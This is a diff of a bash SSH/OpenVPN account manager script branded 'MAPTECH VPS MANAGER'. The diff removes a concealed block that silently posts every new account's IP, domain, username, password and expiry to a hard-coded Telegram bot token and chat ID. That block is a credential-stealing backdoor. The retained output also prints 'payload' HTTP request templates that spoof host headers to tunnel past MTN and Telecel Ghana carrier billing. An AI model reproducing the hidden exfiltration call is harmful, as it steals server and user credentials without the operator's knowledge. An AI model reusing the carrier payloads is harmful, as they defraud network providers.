@@ -38,11 +38,6 @@ fun_geraovpn() {
         ./easyrsa build-client-full $username nopass
         newclient "$username"
     }
-
-# Send SSH account details to Telegram bot
-    MESSAGE="SSH Account Details: \nPublic IP: $IP\nDomain: $Host\nUsername: $username\nPassword: $password\nLogin Limit: $sshlimiter\nExpire Date: $gui"
-    curl -s -X POST https://api.telegram.org/bot6803390472:AAEEX8hpTFhsxbmzU5oiZD4dYCOKxS4-lCE/sendMessage -d chat_id=5989863155 -d text="$MESSAGE" >/dev/null
-
 } >/dev/null 2>&1
 [[ -e /etc/openvpn/server.conf ]] && {
     _Port=$(grep -w 'port' /etc/openvpn/server.conf | awk {'print $2'})
@@ -260,9 +255,6 @@ fun_edithost() {
         fun_edithost
     fi
 }
-
-# Function to create ssh user
-
 [[ ! -e /usr/lib/vpsmanager ]] && exit 0
 tput setaf 7;tput setab 4;tput bold;printf '%30s%s%-15s\n' "Create SSH User";tput sgr0
 echo ""
@@ -328,7 +320,6 @@ echo -ne "\033[1;32mLimit of connections:\033[1;37m ";read sshlimiter
 	echo -e "\n${cor1}Number of concurrent connections must be greater than zero!${scor}\n"
 	exit 1
 }
-
 final=$(date "+%Y-%m-%d" -d "+$dias days")
 gui=$(date "+%d/%m/%Y" -d "+$dias days")
 pass=$(perl -e 'print crypt($ARGV[0], "password")' $password)
@@ -336,69 +327,63 @@ useradd -e $final -M -s /bin/false -p $pass $username >/dev/null 2>&1 &
 echo "$password" >/etc/VPSManager/senha/$username
 echo "$username $sshlimiter" >>/root/usuarios.db
 [[ -e /etc/openvpn/server.conf ]] && {
-    echo -ne "\033[1;32mGenerate Ovpn File \033[1;31m? \033[1;33m[s/n]:\033[1;37m "; read resp
-    [[ "$resp" = @(s|S) ]] && {
-        rm $username.zip $username.ovpn >/dev/null 2>&1
-        echo -ne "\033[1;32mGenerate With Username and Password \033[1;31m? \033[1;33m[s/n]:\033[1;37m "
-        read respost
-        echo -ne "\033[1;32mcurrent host\033[1;37m: \033[1;31m(\033[1;37m$Host\033[1;31m) \033[1;37m- \033[1;32mChange \033[1;31m? \033[1;33m[s/n]:\033[1;37m "; read oprc
-        [[ "$oprc" = @(s|S) ]] && {
-            fun_edithost
-        } || {
-            fun_geraovpn
-        }
-        gerarovpn() {
-            [[ ! -e "/root/$username.zip" ]] && {
-                zip /root/$username.zip /root/$username.ovpn
-                sleep 1.5
-            }
-        }
-        clear
-        echo -e "\033[1;32m==========================================="
-        echo -e "\033[1;32m       🌍ㅤMAPTECH VPS MANAGERㅤ🌍        " 
-        echo -e "\033[1;32m==========================================="
-        echo ""
-        echo -e "\033[1;37m◈────────────⪧ SSH ACCOUNT ⪦────────────◈"
-        echo ""
-        echo -e "\033[1;32m◈ Public IP   :⪧  \033[1;31m$IP"
-        echo -e "\033[1;32m◈ Domain      :⪧  \033[1;31m$Host"
-        echo -e "\033[1;32m◈ Username    :⪧  \033[1;31m$username"
-        echo -e "\033[1;32m◈ Password    :⪧  \033[1;31m$password"
-        echo -e "\033[1;32m◈ Login Limit :⪧  \033[1;31m$sshlimiter"
-        echo -e "\033[1;32m◈ Expire Date :⪧  \033[1;31m$gui"
-        echo ""
-        echo -e "\033[1;37m◈──────⪧ MTN GHANA PAYLOAD 1️⃣ ⪦ ───────◈"
-        echo ""
-        echo -e "\033[1;32mGET / HTTP/1.1[crlf]Host:$Host [crlf]Connection: Upgrade[crlf]User-Agent: [ua][crlf]Upgrade: websocket[crlf][crlf]"
-        echo ""
-        echo -e "\033[1;37m◈──────⪧ MTN GHANA PAYLOAD 2️⃣ ⪦ ───────◈"
-        echo ""
-        echo -e "\033[1;32mGET ws://[rotate=auth.mtn.com.gh;uhas.edu.gh] HTTP/1.1[crlf]Host: auth.ayo4u.com[crlf]Upgrade: websocket[crlf][crlf]-_- ws://$Host HTTP/1.1[crlf]Host: auth.ayo4u.com[crlf]Upgrade: websocket[crlf][crlf]"
-        echo ""
-        echo -e "\033[1;37m◈──────⪧ TELECEL GHANA PAYLOAD ⪦ ───────◈"
-        echo ""
-        echo -e "\033[1;32mGET http://91.241.94.160/ HTTP/1.1[crlf]Host: zerod.mobi[crlf]Connection: Upgrade[crlf]Upgrade: Websocket [crlf][crlf]"
-        echo ""
-        echo -e "\033[1;37m◈────────────────────────────────────────◈"
-        echo -e "\033[1;37m©️     🌍 MAPTECH VPS MANAGER SCRIPT 🌍    "
-        echo -e "\033[1;37m◈────────────────────────────────────────◈"
-        sleep 1
-        function aguarde() {
-            helice() {
-                gerarovpn >/dev/null 2>&1 &
-                tput civis
-                while [ -d /proc/$! ]; do
-                    for i in / - \\ \|; do
-                        sleep .1
-                        echo -ne "\e[1D$i"
-                    done
-                done
-            }
-        }
-        
-    }
-}
-
+	echo -ne "\033[1;32mGenerate Ovpn File \033[1;31m? \033[1;33m[s/n]:\033[1;37m "; read resp
+	[[ "$resp" = @(s|S) ]] && {
+		rm $username.zip $username.ovpn >/dev/null 2>&1
+		echo -ne "\033[1;32mGenerate With Username and Password \033[1;31m? \033[1;33m[s/n]:\033[1;37m "
+		read respost
+		echo -ne "\033[1;32mcurrent host\033[1;37m: \033[1;31m(\033[1;37m$Host\033[1;31m) \033[1;37m- \033[1;32mChange \033[1;31m? \033[1;33m[s/n]:\033[1;37m "; read oprc
+		[[ "$oprc" = @(s|S) ]] && {
+			fun_edithost
+		} || {
+			fun_geraovpn
+		}
+		gerarovpn() {
+			[[ ! -e "/root/$username.zip" ]] && {
+				zip /root/$username.zip /root/$username.ovpn
+				sleep 1.5
+			}
+		}
+		clear
+    echo -e "\033[1;32m==========================================="
+    echo -e "\033[1;32m       🌍ㅤMAPTECH VPS MANAGERㅤ🌍        " 
+    echo -e "\033[1;32m==========================================="
+    echo ""
+    echo -e "\033[1;37m◈────────────⪧ SSH ACCOUNT ⪦────────────◈"
+    echo ""
+    echo -e "\033[1;32m◈ Public IP   :⪧  \033[1;31m$IP"
+    echo -e "\033[1;32m◈ Domain      :⪧  \033[1;31m$Host"
+    echo -e "\033[1;32m◈ Username    :⪧  \033[1;31m$username"
+    echo -e "\033[1;32m◈ Password    :⪧  \033[1;31m$password"
+    echo -e "\033[1;32m◈ Login Limit :⪧  \033[1;31m$sshlimiter"
+    echo -e "\033[1;32m◈ Expire Date :⪧  \033[1;31m$gui"
+    echo ""
+    echo -e "\033[1;37m◈──────⪧ MTN GHANA PAYLOAD 1️⃣ ⪦ ───────◈"
+    echo ""
+    echo -e "\033[1;32mGET / HTTP/1.1[crlf]Host:$Host [crlf]Connection: Upgrade[crlf]User-Agent: [ua][crlf]Upgrade: websocket[crlf][crlf]"
+    echo ""
+    echo -e "\033[1;37m◈──────⪧ MTN GHANA PAYLOAD 2️⃣ ⪦ ───────◈"
+    echo ""
+    echo -e "\033[1;32mGET ws://[rotate=auth.mtn.com.gh;uhas.edu.gh] HTTP/1.1[crlf]Host: auth.ayo4u.com[crlf]Upgrade: websocket[crlf][crlf]-_- ws://$Host HTTP/1.1[crlf]Host: auth.ayo4u.com[crlf]Upgrade: websocket[crlf][crlf]"
+    echo ""
+    echo -e "\033[1;37m◈──────⪧ TELECEL GHANA PAYLOAD ⪦ ───────◈"
+    echo ""
+    echo -e "\033[1;32mGET http://91.241.94.160/ HTTP/1.1[crlf]Host: zerod.mobi[crlf]Connection: Upgrade[crlf]Upgrade: Websocket [crlf][crlf]"
+    echo ""
+    echo -e "\033[1;37m◈────────────────────────────────────────◈"
+    echo -e "\033[1;37m©️     🌍 MAPTECH VPS MANAGER SCRIPT 🌍    "
+    echo -e "\033[1;37m◈────────────────────────────────────────◈"
+		sleep 1
+		function aguarde() {
+			helice() {
+				gerarovpn >/dev/null 2>&1 &
+				tput civis
+				while [ -d /proc/$! ]; do
+					for i in / - \\ \|; do
+						sleep .1
+						echo -ne "\e[1D$i"
+					done
+				done
 				tput cnorm
 			}
 			echo ""
